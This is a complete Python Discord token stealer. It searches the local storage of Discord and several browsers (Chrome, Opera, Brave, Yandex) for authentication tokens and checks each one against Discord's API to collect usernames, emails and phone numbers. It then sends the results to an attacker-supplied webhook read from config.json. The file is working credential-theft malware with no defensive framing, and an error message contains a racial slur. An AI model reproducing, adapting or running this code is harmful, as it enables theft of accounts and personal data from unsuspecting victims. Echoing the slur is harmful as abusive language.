import os
import re
import json
import sys
from urllib.request import Request, urlopen
import requests


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def open_file(file_path):
    file_path = resource_path(file_path)
    with open(file_path) as file:
        data = json.load(file)
        WEBHOOK_URL =data['webhook']
        main(WEBHOOK_URL)








def find_tokens(path):
    
    print("""\
    ___    _ .--.      .--.  ___    _  
    .'   |  | ||  |_     |  |.'   |  | | 
    |   .'  | || _( )_   |  ||   .'  | | 
    .'  '_  | ||(_ o _)  |  |.'  '_  | | 
    '   ( \.-.|| (_,_) \ |  |'   ( \.-.| 
    ' (`. _` /||  |/    \|  |' (`. _` /| 
    | (_ (_) _)|  '  /\  `  || (_ (_) _) 
    \ /  . \ /|    /  \    | \ /  . \ / 
     ``-'`-'' `---'    `---`  ``-'`-''  
                                        
    """)
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main(WEBHOOK_URL):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                try:
                    headers = {
                        'authorization': token,
                        'Content-Type': 'application/json'
                    }
                    res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                    res = res.json()
                    if res['id']:
                        message += f"```{token}: {res['username']}#{res['discriminator']} - ({res['id']}) - {res['email']} - {res['phone']}\n```"
                except:
                    pass
        else:
            message += 'No tokens found.\n'
        headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        print('nigga something went wrong')
    
    


# if __name__ == '__main__':
#     main()
if __name__ == '__main__':
    WEBHOOK_URL = ""
    open_file('config.json')